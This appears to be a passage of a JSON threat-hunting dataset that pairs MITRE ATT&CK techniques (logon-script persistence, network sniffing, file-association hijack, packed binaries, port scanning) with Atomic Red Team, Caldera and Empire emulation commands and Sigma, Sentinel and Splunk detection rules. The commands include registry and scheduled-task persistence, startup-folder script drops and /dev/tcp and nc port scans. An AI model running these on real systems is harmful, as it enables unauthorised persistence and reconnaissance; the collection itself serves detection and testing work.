%temp%\\art.bat\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f\n", "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n", "schtasks /create /tn \"T1037_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1037_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "Copy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "Copy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "Copy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "\\Environment\\UserInitMprLogonScript", "\\Environment\\UserInitMprLogonScript", "python/persistence/multi/desktopfile", "python/persistence/multi/desktopfile", "python/persistence/osx/loginhook", "python/persistence/osx/loginhook"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_command_line contains \"*REG*ADD*HKCU\\\\Environment*UserInitMprLogonScript*\"", "name": "Logon Scripts"}], "possible_detections": [{"data_source": {"action": "global", "title": "Logon Scripts (UserInitMprLogonScript)", "id": "0a98a10c-685d-4ab0-bddc-b6bdd1d48458", "status": "experimental", "description": "Detects creation or execution of UserInitMprLogonScript persistence method", "references": ["https://attack.mitre.org/techniques/T1037/"], "tags": ["attack.t1037", "attack.persistence", "attack.lateral_movement"], "author": "Tom Ueltschi (@c_APT_ure)", "falsepositives": ["exclude legitimate logon scripts", "penetration tests, red teaming"], "level": "high"}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"exec_selection": {"ParentImage": "*\\userinit.exe"}, "exec_exclusion1": {"Image": "*\\explorer.exe"}, "exec_exclusion2": {"CommandLine": "*\\netlogon.bat"}, "condition": "exec_selection and not exec_exclusion1 and not exec_exclusion2"}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"create_keywords_cli": {"CommandLine": "*UserInitMprLogonScript*"}, "condition": "create_keywords_cli"}}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"create_selection_reg": {"EventID": [11, 12, 13, 14]}, "create_keywords_reg": {"TargetObject": "*UserInitMprLogonScript*"}, "condition": "create_selection_reg and create_keywords_reg"}}}]}, {"technique_id": "T1040", "commands": [{"source": "atomics/T1040/T1040.yaml", "command": "tcpdump -c 5 -nnni ens33\ntshark -c 5 -i ens33\n", "name": null}, {"source": "atomics/T1040/T1040.yaml", "command": "tcpdump -c 5 -nnni en0A\ntshark -c 5 -i en0A\n", "name": null}, {"source": "atomics/T1040/T1040.yaml", "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\nc:\\windump.exe\n", "name": null}, {"source": "atomics/T1040/T1040.yaml", "command": "& \"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\n& c:\\windump.exe\n", "name": null}, {"source": "data/abilities/credential-access/1b4fb81c-8090-426c-93ab-0a633e7a16a7.yml", "command": {"windows": {"psh": {"command": "New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath \"$ENV:UserProfile\\Desktop\\pcap.etl\" -MaxFileSize 0\nAdd-NetEventPacketCaptureProvider -SessionName \"PCAP\"\nStart-NetEventSession -Name \"PCAP\"\nStart-Sleep -s 60\nStop-NetEventSession -Name \"PCAP\"\nGet-Content \"$ENV:UserProfile\\Desktop\\pcap.etl\"\n", "cleanup": "Remove-NetEventSession -Name \"Capture\"\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.cab\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}, "name": "Perform a packet capture"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/packet_capture", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/packet_capture", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/sniffer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/sniffer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/sniffer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/sniffer", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "tcpdump -c 5 -nnni #{interface}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "tshark -c 5 -i #{interface}", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Network Sniffing": {"attack_technique": "T1040", "display_name": "Network Sniffing", "atomic_tests": [{"name": "Packet Capture Linux", "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. \n", "supported_platforms": ["linux"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "String", "default": "ens33"}}, "executor": {"name": "bash", "elevation_required": true, "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n"}}, {"name": "Packet Capture macOS", "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n", "supported_platforms": ["macos"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "String", "default": "en0A"}}, "executor": {"name": "bash", "elevation_required": true, "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n"}}, {"name": "Packet Capture Windows Command Prompt", "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled, along with WinPCAP. Windump will require the windump executable.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface Ethernet0.\n", "supported_platforms": ["windows"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "String", "default": "Ethernet0"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\nc:\\windump.exe\n"}}, {"name": "Packet Capture PowerShell", "description": "Perform a packet capture using PowerShell with windump or tshark. This will require a host that has Wireshark/Tshark\ninstalled, along with WinPCAP. Windump will require the windump executable.\n\nUpon successful execution, tshark will spawn from powershell and capture 5 packets on interface Ethernet0.\n", "supported_platforms": ["windows"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "String", "default": "Ethernet0"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "& \"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\n& c:\\windump.exe\n"}}]}}, {"Mitre Stockpile - Perform a packet capture": {"id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "name": "Sniff network traffic", "description": "Perform a packet capture", "tactic": "credential-access", "technique": {"attack_id": "T1040", "name": "Network Sniffing"}, "platforms": {"windows": {"psh": {"command": "New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath \"$ENV:UserProfile\\Desktop\\pcap.etl\" -MaxFileSize 0\nAdd-NetEventPacketCaptureProvider -SessionName \"PCAP\"\nStart-NetEventSession -Name \"PCAP\"\nStart-Sleep -s 60\nStop-NetEventSession -Name \"PCAP\"\nGet-Content \"$ENV:UserProfile\\Desktop\\pcap.etl\"\n", "cleanup": "Remove-NetEventSession -Name \"Capture\"\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.cab\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/packet_capture", "ATT&CK Technique #1": "T1040", "ATT&CK Technique #2": "", "Technique": "Network Sniffing", "Concatenate for Python Dictionary": "\"powershell/collection/packet_capture\":  [\"T1040\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/linux/sniffer", "ATT&CK Technique #1": "T1040", "ATT&CK Technique #2": "", "Technique": "Network Sniffing", "Concatenate for Python Dictionary": "\"python/collection/linux/sniffer\":  [\"T1040\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/sniffer", "ATT&CK Technique #1": "T1040", "ATT&CK Technique #2": "", "Technique": "Network Sniffing", "Concatenate for Python Dictionary": "\"python/collection/osx/sniffer\":  [\"T1040\"],"}}], "command_list": ["tcpdump -c 5 -nnni ens33\ntshark -c 5 -i ens33\n", "tcpdump -c 5 -nnni en0A\ntshark -c 5 -i en0A\n", "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\nc:\\windump.exe\n", "& \"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5\n& c:\\windump.exe\n", {"windows": {"psh": {"command": "New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath \"$ENV:UserProfile\\Desktop\\pcap.etl\" -MaxFileSize 0\nAdd-NetEventPacketCaptureProvider -SessionName \"PCAP\"\nStart-NetEventSession -Name \"PCAP\"\nStart-Sleep -s 60\nStop-NetEventSession -Name \"PCAP\"\nGet-Content \"$ENV:UserProfile\\Desktop\\pcap.etl\"\n", "cleanup": "Remove-NetEventSession -Name \"Capture\"\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.cab\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}, "powershell/collection/packet_capture", "powershell/collection/packet_capture", "python/collection/linux/sniffer", "python/collection/linux/sniffer", "python/collection/osx/sniffer", "python/collection/osx/sniffer", "tcpdump -c 5 -nnni #{interface}", "tshark -c 5 -i #{interface}"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"tshark.exe\"or process_path contains \"windump.exe\"or process_path contains \"logman.exe\"or process_path contains \"tcpdump.exe\"or process_path contains \"wprui.exe\"or process_path contains \"wpr.exe\")", "name": "Network Sniffing"}, {"product": "Splunk", "query": "index=linux sourcetype=syslog entered promiscuous mode | table host,message", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=syslog left promiscuous mode | table host,message", "name": null}], "possible_detections": [{"data_source": "/var/log/messages"}, {"data_source": {"title": "Network Sniffing", "id": "f4d3748a-65d1-4806-bd23-e25728081d01", "status": "experimental", "description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.yaml"], "logsource": {"product": "linux", "service": "auditd"}, "detection": {"selection1": {"type": "execve", "a0": "tcpdump", "a1": "-c", "a3|contains": "-i"}, "selection2": {"type": "execve", "a0": "tshark", "a1": "-c", "a3": "-i"}, "condition": "selection1 or selection2"}, "falsepositives": ["Legitimate administrator or user uses network sniffing tool for legitimate reason"], "level": "low", "tags": ["attack.credential_access", "attack.discovery", "attack.t1040"]}}, {"data_source": {"title": "Capture a Network Trace with netsh.exe", "id": "d3c3861d-c504-4c77-ba55-224ba82d0118", "status": "experimental", "description": "Detects capture a network trace via netsh.exe trace functionality", "references": ["https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/"], "author": "Kutepov Anton, oscd.community", "date": "2019/10/24", "tags": ["attack.discovery", "attack.t1040"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine|contains|all": ["netsh", "trace", "start"]}, "condition": "selection"}, "falsepositives": ["Legitimate administrator or user uses netsh.exe trace functionality for legitimate reason"], "level": "medium"}}, {"data_source": {"title": "Network Sniffing", "id": "ba1f7802-adc7-48b4-9ecb-81e227fddfd5", "status": "experimental", "description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": [{"Image|endswith": "\\tshark.exe", "CommandLine|contains": "-i"}, {"Image|endswith": "\\windump.exe"}], "condition": "selection"}, "falsepositives": ["Admin activity"], "fields": ["Image", "CommandLine", "User", "LogonGuid", "Hashes", "ParentProcessGuid", "ParentCommandLine"], "level": "low", "tags": ["attack.credential_access", "attack.discovery", "attack.t1040"]}}]}, {"technique_id": "T1042", "commands": [{"source": "atomics/T1042/T1042.yaml", "command": "assoc .hta=#{target_extension_handler}\n", "name": null}, {"source": "atomics/T1042/T1042.yaml", "command": "assoc #{extension_to_change}=txtfile\n", "name": null}, {"source": "SysmonHunter - Change Default File Association", "command": "\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts|HKCR\\\\.+\\\\shell\\\\open\\\\commandWindows\\Explorer.EXE", "name": null}, {"source": "SysmonHunter - Change Default File Association", "command": "assoc.exe", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Change Default File Association": {"attack_technique": "T1042", "display_name": "Change Default File Association", "atomic_tests": [{"name": "Change Default File Association", "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n", "supported_platforms": ["windows"], "input_arguments": {"extension_to_change": {"description": "File Extension To Hijack", "type": "String", "default": ".hta"}, "target_extension_handler": {"description": "txtfile maps to notepad.exe", "type": "Path", "default": "txtfile"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "assoc #{extension_to_change}=#{target_extension_handler}\n", "cleanup_command": "assoc .hta=htafile\n"}}]}}, {"SysmonHunter - T1042": {"name": "Change Default File Association", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts|HKCR\\\\.+\\\\shell\\\\open\\\\command", "flag": "regex"}}, "process": {"image": {"pattern": "Windows\\Explorer.EXE", "op": "not"}}, "op": "and"}, {"type": "process", "process": {"any": {"pattern": "assoc.exe"}}}]}}], "command_list": ["assoc .hta=#{target_extension_handler}\n", "assoc #{extension_to_change}=txtfile\n", "\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts|HKCR\\\\.+\\\\shell\\\\open\\\\commandWindows\\Explorer.EXE", "assoc.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\SOFTWARE\\\\Classes\\\\\"or registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\GlobalAssocChangedCounter\")", "name": "Change Default File Association"}], "possible_detections": [{"data_source": {"title": "Change Default File Association", "id": "3d3aa6cd-6272-44d6-8afc-7e88dfef7061", "status": "experimental", "description": "When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1042/T1042.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine|contains|all": ["cmd", "/c", "assoc"]}, "condition": "selection"}, "falsepositives": ["Admin activity"], "fields": ["Image", "CommandLine", "User", "LogonGuid", "Hashes", "ParentProcessGuid", "ParentCommandLine"], "level": "low", "tags": ["attack.persistence", "attack.t1042"]}}]}, {"technique_id": "T1045", "commands": [{"source": "atomics/T1045/T1045.yaml", "command": "cp PathToAtomicsFolder/T1045/bin/linux/test_upx /tmp/packed_bin && /tmp/packed_bin\n", "name": null}, {"source": "atomics/T1045/T1045.yaml", "command": "cp PathToAtomicsFolder/T1045/bin/linux/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin\n", "name": null}, {"source": "atomics/T1045/T1045.yaml", "command": "cp PathToAtomicsFolder/T1045/bin/darwin/test_upx /tmp/packed_bin && /tmp/packed_bin\n", "name": null}, {"source": "atomics/T1045/T1045.yaml", "command": "cp PathToAtomicsFolder/T1045/bin/darwin/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Software Packing": {"attack_technique": "T1045", "display_name": "Software Packing", "atomic_tests": [{"name": "Binary simply packed by UPX (linux)", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "supported_platforms": ["linux"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "Path", "default": "PathToAtomicsFolder/T1045/bin/linux/test_upx"}}, "executor": {"name": "sh", "elevation_required": false, "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n"}}, {"name": "Binary packed by UPX, with modified headers (linux)", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "supported_platforms": ["linux"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "Path", "default": "PathToAtomicsFolder/T1045/bin/linux/test_upx_header_changed"}}, "executor": {"name": "sh", "elevation_required": false, "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n"}}, {"name": "Binary simply packed by UPX", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "supported_platforms": ["macos"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "Path", "default": "PathToAtomicsFolder/T1045/bin/darwin/test_upx"}}, "executor": {"name": "sh", "elevation_required": false, "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n"}}, {"name": "Binary packed by UPX, with modified headers", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "supported_platforms": ["macos"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "Path", "default": "PathToAtomicsFolder/T1045/bin/darwin/test_upx_header_changed"}}, "executor": {"name": "sh", "elevation_required": false, "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n"}}]}}], "command_list": ["cp PathToAtomicsFolder/T1045/bin/linux/test_upx /tmp/packed_bin && /tmp/packed_bin\n", "cp PathToAtomicsFolder/T1045/bin/linux/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin\n", "cp PathToAtomicsFolder/T1045/bin/darwin/test_upx /tmp/packed_bin && /tmp/packed_bin\n", "cp PathToAtomicsFolder/T1045/bin/darwin/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1046", "commands": [{"source": "atomics/T1046/T1046.yaml", "command": "for port in {1..65535};\ndo\n  echo >/dev/tcp/192.168.1.1/$port && echo \"port $port is open\" || echo \"port $port is closed\" : ;\ndone\n", "name": null}, {"source": "atomics/T1046/T1046.yaml", "command": "nmap -sS 192.168.1.0/24 -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", "name": null}, {"source": "atomics/T1046/T1046.yaml", "command": null, "name": null}, {"source": "atomics/T1046/T1046.yaml", "command": "nmap -sS #{network_range} -p #{port}\ntelnet 192.168.1.1 #{port}\nnc -nv 192.168.1.1 #{port}\n", "name": null}, {"source": "data/abilities/discovery/3a2ce3d5-e9e2-4344-ae23-470432ff8687.yml", "command": {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}, "name": "Uses nmap to fingerprint services that were network accessible"}, {"source": "data/abilities/discovery/47abe1f5-55a5-46cc-8cad-506dac8ea6d9.yml", "command": {"darwin": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}, "linux": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}}, "name": "Use dropped scanner to find open popular ports"}, {"source": "data/abilities/discovery/5a4cb2be-2684-4801-9355-3a90c91e0004.yml", "command": {"windows": {"psh": {"command": "$local_addr = (Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne \"Disconnected\" }).IPv4Address.IPAddress;\n$temp = $local_addr.split('.')[0..2];\n$construct = $temp[0] + '.' + $temp[1] + '.' + $temp[2] + \".\";\n1..255 | % { $a = $_; write-host \"------\"; write-host \"$construct$a\";\n22,53,80,445 | % { $socket = new-object system.net.sockets.tcpclient;\n$Connection = $socket.beginconnect(\"$construct$a\", $_, $null, $null);\n$Connection.AsyncWaitHandle.waitOne(50,$false) | out-null;\nif ($socket.connected -eq $true) { echo \"Port $_ is open!\"};\n$socket.Close | Out-Null; }}\n"}}}, "name": "Scans the local network for common open ports"}, {"source": "Threat Hunting Tables", "command": "rcpping.exe -s 127.0.0.1 -t ncacn_np", "name": null}, {"source": "Threat Hunting Tables", "command": "rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_instance_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_instance_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_server_info", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_sql_server_info", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/portscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/portscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/find_fruit", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/port_scan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/port_scan", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Network Service Scanning": {"attack_technique": "T1046", "display_name": "Network Service Scanning", "atomic_tests": [{"name": "Port Scan", "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "elevation_required": false, "command": "for port in {1..65535};\ndo\n  echo >/dev/tcp/192.168.1.1/$port && echo \"port $port is open\" || echo \"port $port is closed\" : ;\ndone\n"}}, {"name": "Port Scan Nmap", "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"network_range": {"description": "Network Range to Scan.", "type": "string", "default": "192.168.1.0/24"}, "port": {"description": "Ports to scan.", "type": "string", "default": 80}, "host": {"description": "Host to scan.", "type": "string", "default": "192.168.1.1"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if nmap command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1;\n", "get_prereq_command": "echo \"Install nmap on the machine to run the test.\"; exit 1;\n"}], "executor": {"name": "sh", "command": "nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n"}}]}}, {"Mitre Stockpile - Uses nmap to fingerprint services that were network accessible": {"id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687", "name": "Fingerprint network services", "description": "Uses nmap to fingerprint services that were network accessible", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "platforms": {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}}}, {"Mitre Stockpile - Use dropped scanner to find open popular ports": {"id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9", "name": "Scan IP for ports", "description": "Use dropped scanner to find open popular ports", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "platforms": {"darwin": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}, "linux": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}}}}, {"Mitre Stockpile - Scans the local network for common open ports": {"id": "5a4cb2be-2684-4801-9355-3a90c91e0004", "name": "Network Service Scanning", "description": "Scans the local network for common open ports", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "platforms": {"windows": {"psh": {"command": "$local_addr = (Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne \"Disconnected\" }).IPv4Address.IPAddress;\n$temp = $local_addr.split('.')[0..2];\n$construct = $temp[0] + '.' + $temp[1] + '.' + $temp[2] + \".\";\n1..255 | % { $a = $_; write-host \"------\"; write-host \"$construct$a\";\n22,53,80,445 | % { $socket = new-object system.net.sockets.tcpclient;\n$Connection 